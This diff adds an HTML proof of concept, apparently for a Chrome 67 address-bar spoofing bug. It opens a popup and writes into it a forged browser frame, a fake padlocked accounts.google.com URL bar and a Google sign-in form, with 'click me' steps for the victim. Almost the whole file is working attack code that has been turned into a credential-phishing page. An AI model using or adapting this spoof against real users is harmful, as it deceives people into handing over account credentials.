@@ -1,0 +1,59 @@
+<html>
+<head>
+<!--
+    author: evi1m0.bat[at]gmail.com
+    test version: Google Chrome 67.0.3396.62
+-->
+</head>
+<body>
+<script>
+    function pwn() {
+        v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
+        i = setInterval(`
+            x.document.write("<html>
+                <head><title>Google Login</title></head>
+                <body style="margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif; overflow:hidden;">
+                    
+                    <!-- FAKE NATIVE BROWSER TOP BAR (Menggantikan Address Bar yang Blank) -->
+                    <div style="background:#dee1e6; height:40px; display:flex; align-items:center; padding:0 15px; border-bottom:1px solid #c2c2c2;">
+                        <span style="display:inline-block; width:12px; height:12px; background:#ff5f56; border-radius:50%; margin-right:8px;"></span>
+                        <span style="display:inline-block; width:12px; height:12px; background:#ffbd2e; border-radius:50%; margin-right:8px;"></span>
+                        <span style="display:inline-block; width:12px; height:12px; background:#27c93f; border-radius:50%; margin-right:8px;"></span>
+                        <div style="background:#fff; border-radius:8px 8px 0 0; height:32px; margin-top:8px; margin-left:20px; padding:0 20px; display:flex; align-items:center; font-size:13px; color:#3c4043; font-weight:500;">
+                            Login - Google Accounts
+                        </div>
+                    </div>
+                    
+                    <!-- FAKE OMNIBOX / URL BAR -->
+                    <div style="background:#fff; height:46px; display:flex; align-items:center; padding:0 15px; border-bottom:1px solid #dadce0;">
+                        <span style="font-size:18px; color:#5f6368; letter-spacing:8px; margin-right:15px; user-select:none;">← → ↻</span>
+                        <div style="flex-grow:1; background:#f1f3f4; height:30px; border-radius:15px; display:flex; align-items:center; padding:0 15px; font-size:14px; color:#202124;">
+                            <span style="font-size:13px; margin-right:8px;">🔒</span> <b>https://accounts.google.com</b>/signin/v2/identifier
+                        </div>
+                    </div>
+
+                    <!-- FAKE PAGE CONTENT (Phishing Form) -->
+                    <div style="padding: 40px 20px; text-align: center; background: #fff; height: calc(100vh - 86px);">
+                        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="width: 100px; margin-bottom: 20px;">
+                        <h2 style="margin: 0 0 10px 0; font-weight: 400; font-size: 24px;">Sign in</h2>
+                        <p style="margin: 0 0 40px 0; font-size: 16px;">Use your Google Account</p>
+                        
+                        <input type="text" placeholder="Email or phone" style="width: 100%; max-width: 350px; padding: 13px 15px; font-size: 16px; border: 1px solid #c2c2c2; border-radius: 4px; box-sizing: border-box; margin-bottom: 40px;">
+                        
+                        <div style="display: flex; justify-content: space-between; max-width: 350px; margin: 0 auto;">
+                            <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; margin-top:10px;">Forgot email?</a>
+                            <button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer;">Next</button>
+                        </div>
+                    </div>
+                </body>
+                </html>");
+            clearInterval(v);
+            clearInterval(i);
+            `, 3);
+    }
+</script>
+<li onclick="pwn()">step1: click me</li>
+<li>step2: try use keyboard `command + r`</li>
+<li>step3: xD</li>
+</body>
+</html>
